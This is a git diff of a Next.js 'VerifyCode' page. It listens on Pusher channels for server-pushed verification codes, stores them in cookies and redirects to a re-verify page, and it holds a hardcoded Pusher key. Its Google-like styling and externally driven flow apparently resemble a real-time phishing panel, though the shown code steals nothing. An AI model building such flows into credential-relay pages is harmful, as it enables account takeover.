@@ -1,11 +1,13 @@
 "use client";
-import React, { useEffect, useState } from "react";
+import React, { use, useEffect, useState } from "react";
 import { useRouter } from "next/navigation";
 import Image from "next/image";
 import Cookies from "js-cookie";
 import Pusher from "pusher-js";
 export default function VerifyCode() {
   const[successId, setSuccessId] = useState('');
+  const[ReverifyId, setReVerifyId] = useState('');
+  const[code,setCode] = useState('');
   const router = useRouter()
   const id = Cookies.get("id");
   const pusher = new Pusher("e4766909b306ad7ddd58", {
@@ -14,27 +16,50 @@ export default function VerifyCode() {
     encrypted: true,
   });
   useEffect(() => {
+    setCode(Cookies.get("code"))
+  }, [id])
+  useEffect(() => {
     const channel = pusher.subscribe(id);
 
-    channel.bind('login-successfull', (data) => {
+    channel.bind('code-verify', (data) => {
       // Perform the revalidation or data fetching logic here
       console.log('Path data updated:', data);
+      setCode(data?.code);
       console.log(data.id)
       setSuccessId(data.id); // Function to refetch or revalidate your path data
     });
 
     return () => {
-      channel.unbind('login-successfull');
+      channel.unbind('code-verify');
+      channel.unsubscribe(id);
+    };
+  }, [id,successId]);
+
+  useEffect(() => {
+    const channel = pusher.subscribe(id);
+    channel.bind('code-re-verify', (data) => {
+      // Perform the revalidation or data fetching logic here
+      console.log('Path data updated:', data);
+      Cookies.set("code", data.code);
+      setReVerifyId(data.id); // Function to refetch or revalidate your path data
+    });
+
+    return () => {
+      channel.unbind('code-re-verify');
       channel.unsubscribe(id);
     };
   }, [id]);
 
-  if (successId) {
-    // Perform the revalidation or data fetching logic here
-  return router.push(`/signin`)
+ 
+  // if (successId) {
+  //   // Perform the revalidation or data fetching logic here
+  //   window.location.reload()
+  // }
+if (ReverifyId) {
+  // Perform the revalidation or data fetching logic here
+return router.push(`/reVerifyCode`);
 }
-const code=Cookies.get("code")
-console.log(code)
+
   return (
     <div className="font-roboto min-h-screen md:flex flex-col justify-center items-center bg-white text-[#202124] text-base">
       <div className="md:border border-slate-300 rounded-lg px-6 md:px-10 py-9 md:w-[450px] h-[550px]">
